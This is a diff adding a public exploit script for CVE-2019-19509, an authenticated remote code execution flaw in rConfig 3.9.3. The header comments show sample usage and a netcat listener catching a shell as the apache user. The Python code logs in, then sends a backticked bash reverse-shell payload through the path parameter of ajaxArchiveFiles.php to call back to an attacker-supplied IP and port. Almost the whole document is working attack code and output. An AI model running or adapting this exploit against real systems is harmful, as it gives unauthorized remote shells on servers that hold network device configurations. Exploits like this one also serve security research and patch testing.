@@ -1,0 +1,75 @@
+# Exploit Title: rConfig 3.9.3 - Authenticated Remote Code Execution
+# Date: 2019-11-07
+# CVE-2019-19509
+# Exploit Author: vikingfr
+# Vendor Homepage: https://rconfig.com/ (see also : https://github.com/rconfig/rconfig)
+# Software Link : http://files.rconfig.com/downloads/scripts/centos7_install.sh
+# Version: tested v3.9.3
+# Tested on: Apache/2.4.6 (CentOS 7.7) OpenSSL/1.0.2k-fips PHP/7.2.24
+#
+# Notes : If you want to reproduce in your lab environment follow those links :
+# http://help.rconfig.com/gettingstarted/installation
+# then
+# http://help.rconfig.com/gettingstarted/postinstall
+#
+# $ python3 rconfig_CVE-2019-19509.py https://192.168.43.34 admin root 192.168.43.245 8081
+# rconfig - CVE-2019-19509 - Web authenticated RCE
+# [+] Logged in successfully, triggering the payload...
+# [+] Check your listener !
+# ...
+# $ nc -nvlp 8081
+# listening on [any] 8081 ...
+# connect to [192.168.43.245] from (UNKNOWN) [192.168.43.34] 34458
+# bash: no job control in this shell
+# bash-4.2$ id
+# id
+# uid=48(apache) gid=48(apache) groups=48(apache)
+# bash-4.2$ 
+
+#!/usr/bin/python3
+
+import requests
+import sys
+import urllib.parse
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+print ("rconfig - CVE-2019-19509 - Web authenticated RCE")
+
+if len(sys.argv) != 6:
+    print ("[+] Usage : ./rconfig_exploit.py https://target username password yourIP yourPort")
+    exit()
+
+target = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+ip = sys.argv[4]
+port = sys.argv[5]
+payload = '''`bash -i>& /dev/tcp/{0}/{1} 0>&1`'''.format(ip, port)
+
+request = requests.session()
+
+login_info = {
+    "user": username,
+    "pass": password,
+    "sublogin": 1
+}
+
+login_request = request.post(
+    target+"/lib/crud/userprocess.php",
+     login_info,
+     verify=False,
+     allow_redirects=True
+ )
+
+dashboard_request = request.get(target+"/dashboard.php", allow_redirects=False)
+
+if dashboard_request.status_code == 200:
+    print ("[+] Logged in successfully, triggering the payload...")
+    encoded_request = target+"/lib/ajaxHandlers/ajaxArchiveFiles.php?path={0}&ext=random".format(urllib.parse.quote(payload))
+    print ("[+] Check your listener !")
+    exploit_req = request.get(encoded_request)
+
+elif dashboard_request.status_code == 302:
+    print ("[-] Wrong credentials !")
+    exit()
